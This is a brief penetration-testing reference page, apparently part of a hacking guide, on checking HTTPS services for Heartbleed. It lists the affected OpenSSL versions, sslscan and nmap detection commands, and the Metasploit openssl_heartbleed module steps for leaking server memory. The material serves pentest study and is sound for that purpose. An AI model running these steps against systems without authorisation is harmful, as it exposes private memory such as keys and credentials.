---
title: ""
permalink: /443-HTTPS/
layout: single
author-profile: true
---
# 443-HTTPS

Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities.
Heartbleed

OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable

First we need to investigate if the https-page is vulnerable to heartbleed, we can do that the following way:

sudo sslscan ip:443

  or using a nmap script

  nmap -sV --script=ssl-heartbleed ip

You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.

- use auxiliary/scanner/ssl/openssl_heartbleed
- set RHOSTS 192.168.101.8
- set verbose true
- run

Now you have a flow of random data, some of it might be of interest to you.
- CRIME
- Breach
- Certificate

Read the certificate.

Does it include names that might be useful?

